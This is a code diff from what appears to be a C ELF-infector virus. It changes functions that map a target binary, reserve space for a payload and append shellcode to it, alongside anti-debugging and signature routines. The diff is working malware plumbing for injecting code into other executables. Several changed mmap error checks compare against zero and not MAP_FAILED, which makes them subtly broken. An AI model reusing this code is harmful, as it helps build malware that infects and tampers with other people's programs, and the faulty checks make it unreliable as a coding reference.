@@ -420,11 +420,6 @@ static int   preventDebug(void) {
 }
 
 static void encryptStart(void) {}
-struct bfile {
-  int         fd;
-  off_t       size;
-  Elf64_Ehdr  *header;
-};
 
 static void       dynamicSignature(void) {
   asm("nop\n\t"
@@ -459,18 +454,25 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     munmap(tmp, len);
     return (1);
   }
+  // TODO Change to O_RDONLY
   if ((fd = open(tmp, O_RDWR, 0)) < 0) {
     munmap(tmp, len);
     return (-1);
   }
-  if ((bin->header = mmap(0, stats.st_size + strlen(payload) + sizeof(size_t), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
+  munmap(tmp, len);
+  if ((tmp = mmap(0, stats.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) < 0) {
     close(fd);
-    munmap(tmp, len);
     return (-1);
   }
-  munmap(tmp, len);
+  if ((bin->header = mmap(0, stats.st_size + strlen(payload) + sizeof(size_t) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) < 0) {
+    close(fd);
+    munmap(tmp, stats.st_size);
+    return (-1);
+  }
+  memcpy(bin->header, tmp, stats.st_size);
+  munmap(tmp, stats.st_size);
   bin->fd = fd;
-  bin->size = stats.st_size;
+  bin->size = stats.st_size + strlen(payload) + sizeof(size_t) + 1;
   return (0);
 }
 
@@ -597,7 +599,7 @@ static int  appendShellcode(struct bfile *bin) {
 
   size = end - start + (lambdaEnd - lambdaStart);
   new.size = bin->size + size + sizeof(ins);
-  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0))  < 0)
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   copyModifiedCode(&new, bin->size, size);
